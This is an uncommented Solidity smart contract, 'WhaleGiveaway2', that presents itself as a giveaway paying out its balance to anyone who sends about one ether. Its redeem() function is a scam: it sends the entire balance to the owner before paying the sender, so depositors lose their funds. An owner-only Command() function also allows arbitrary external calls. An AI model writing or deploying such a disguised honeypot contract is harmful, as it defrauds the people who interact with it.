pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public Owner;

    uint public constant minEligibility = 0.999001 ether;

    function WhaleGiveaway2() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        bool success;
        bytes4 sig = bytes4(keccak256("execute(bytes)"));
        assembly {
            let ptr := mload(0x40)
            mstore(ptr,sig)
            mstore(add(ptr,0x04),data)
            success := call(gas, adr, msg.value, ptr, 0x24, ptr, 0x0)
        }
        require(success);
    }
}